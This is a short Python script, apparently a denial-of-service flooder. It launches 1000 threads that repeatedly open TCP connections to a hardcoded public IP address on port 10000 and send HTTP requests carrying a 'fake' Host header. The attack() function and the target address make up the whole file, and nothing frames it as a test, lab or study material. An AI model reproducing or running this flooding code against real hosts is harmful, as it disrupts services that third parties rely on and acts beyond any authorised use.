import threading
import socket
import time

target = "92.170.23.89"
# target = "192.168.1.44"
port = 10000
fake_ip = "186.15.1.1"

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + " \r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global already_connected
        already_connected += 1
        if already_connected % 500 == 0:
            print(already_connected)

        time.sleep(1)

for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()
